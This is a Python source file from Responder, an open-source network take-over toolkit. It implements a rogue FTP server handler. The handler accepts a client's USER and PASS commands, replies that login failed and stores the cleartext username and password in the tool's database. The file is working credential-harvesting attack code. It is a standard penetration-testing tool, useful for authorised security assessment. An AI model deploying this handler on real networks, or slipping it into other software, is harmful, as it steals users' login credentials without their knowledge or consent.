#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from responder.src.utils import *
from responder.src import settings

if settings.Config.PY2OR3 == "PY3":
    from socketserver import BaseRequestHandler
else:
    from SocketServer import BaseRequestHandler

from responder.src.packets import FTPPacket


class FTP(BaseRequestHandler):
    def handle(self):
        try:
            self.request.send(NetworkSendBufferPython2or3(FTPPacket()))
            data = self.request.recv(1024)

            if data[0:4] == b"USER":
                User = data[5:].strip().decode("latin-1")

                Packet = FTPPacket(Code="331", Message="User name okay, need password.")
                self.request.send(NetworkSendBufferPython2or3(Packet))
                data = self.request.recv(1024)

            if data[0:4] == b"PASS":
                Pass = data[5:].strip().decode("latin-1")
                Packet = FTPPacket(Code="530", Message="User not logged in.")
                self.request.send(NetworkSendBufferPython2or3(Packet))

                SaveToDb(
                    {
                        "module": "FTP",
                        "type": "Cleartext",
                        "client": self.client_address[0],
                        "user": User,
                        "cleartext": Pass,
                        "fullhash": User + ":" + Pass,
                    }
                )

            else:
                Packet = FTPPacket(Code="502", Message="Command not implemented.")
                self.request.send(NetworkSendBufferPython2or3(Packet))
                data = self.request.recv(1024)

        except Exception:
            self.request.close()
            pass
